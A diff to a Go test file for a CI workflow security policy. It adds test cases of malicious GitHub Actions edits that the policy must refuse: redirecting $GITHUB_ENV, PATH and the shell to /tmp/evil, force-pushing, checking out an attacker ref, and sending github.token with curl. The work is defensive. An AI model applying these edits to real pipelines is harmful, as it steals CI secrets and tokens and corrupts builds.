@@ -50,18 +50,65 @@ func mutate(t *testing.T, file string, f func(wf map[string]any)) map[string]map
 func jobOf(wf map[string]any, id string) map[string]any { return asMap(asMap(wf["jobs"])[id]) }
 
 func TestWorkflowPolicyAllowsOrdinaryChanges(t *testing.T) {
-	after := mutate(t, "codeaf.yml", func(wf map[string]any) {
-		run := jobOf(wf, "run")
-		steps := asSlice(run["steps"])
-		// A changed run script in a step without secrets, and a new step
-		// using an action the default branch already uses.
-		asMap(steps[2])["run"] = "codeaf do --timeout 90m"
-		run["steps"] = append(steps, map[string]any{"name": "lint", "uses": pin})
-		// A new read-only job.
-		asMap(wf["jobs"])["plan"] = map[string]any{"permissions": map[string]any{"contents": "read"}, "steps": []any{map[string]any{"run": "harness next"}}}
+	// Unprivileged jobs (read-only, no secret, no token) may change freely:
+	// a changed run script, a new step using an action the default branch
+	// already uses, and a new read-only job.
+	after := mutate(t, "ci.yml", func(wf map[string]any) {
+		goJob := jobOf(wf, "go")
+		steps := asSlice(goJob["steps"])
+		asMap(steps[1])["run"] = "go test -race ./..."
+		goJob["steps"] = append(steps, map[string]any{"name": "lint", "uses": pin})
+		asMap(wf["jobs"])["vet"] = map[string]any{"permissions": map[string]any{"contents": "read"}, "steps": []any{map[string]any{"run": "go vet ./..."}}}
 	})
 	if v := WorkflowPolicy(baseWorkflows(t), after); len(v) != 0 {
 		t.Fatalf("ordinary change refused: %v", v)
+	}
+}
+
+// TestWorkflowPolicyFreezesPrivilegedJobs pins the review finding of
+// 2026-10-17: a step that names no secret can still feed the step that does.
+// Each of these edits leaves the secret-bearing step byte-identical and would
+// still have exfiltrated the key, or used the token, before the job freeze.
+func TestWorkflowPolicyFreezesPrivilegedJobs(t *testing.T) {
+	cases := []struct {
+		name string
+		file string
+		f    func(wf map[string]any)
+	}{
+		{"edit an unprivileged step in a job that holds a secret", "codeaf.yml", func(wf map[string]any) {
+			asMap(asSlice(jobOf(wf, "run")["steps"])[2])["run"] = "cp /tmp/evil harness"
+		}},
+		{"add a step before the secret step", "codeaf.yml", func(wf map[string]any) {
+			run := jobOf(wf, "run")
+			steps := asSlice(run["steps"])
+			run["steps"] = append([]any{map[string]any{"run": "echo HARNESS=/tmp/evil >> $GITHUB_ENV"}}, steps...)
+		}},
+		{"change the checkout of a job that holds a secret", "codeaf.yml", func(wf map[string]any) {
+			asMap(asSlice(jobOf(wf, "run")["steps"])[0])["with"] = map[string]any{"ref": "evil"}
+		}},
+		{"edit a step in a write-scoped job", "codeaf.yml", func(wf map[string]any) {
+			asMap(asSlice(jobOf(wf, "publish")["steps"])[0])["run"] = "git push --force"
+		}},
+		{"top-level defaults in a workflow with a privileged job", "codeaf.yml", func(wf map[string]any) {
+			wf["defaults"] = map[string]any{"run": map[string]any{"shell": "bash /tmp/evil {0}"}}
+		}},
+		{"top-level non-secret env in a workflow with a privileged job", "codeaf.yml", func(wf map[string]any) {
+			wf["env"] = map[string]any{"PATH": "/tmp/evil"}
+		}},
+		{"token used in an existing read-only job", "ci.yml", func(wf map[string]any) {
+			asMap(asSlice(jobOf(wf, "go")["steps"])[1])["env"] = map[string]any{"GH_TOKEN": "${{ github.token }}"}
+		}},
+		{"token used in a new job", "ci.yml", func(wf map[string]any) {
+			asMap(wf["jobs"])["evil"] = map[string]any{"permissions": map[string]any{"contents": "read"},
+				"steps": []any{map[string]any{"env": map[string]any{"T": "${{ github.token }}"}, "run": "curl -H \"Authorization: $T\" x"}}}
+		}},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			if v := WorkflowPolicy(baseWorkflows(t), mutate(t, c.file, c.f)); len(v) == 0 {
+				t.Fatal("refused nothing")
+			}
+		})
 	}
 }
 
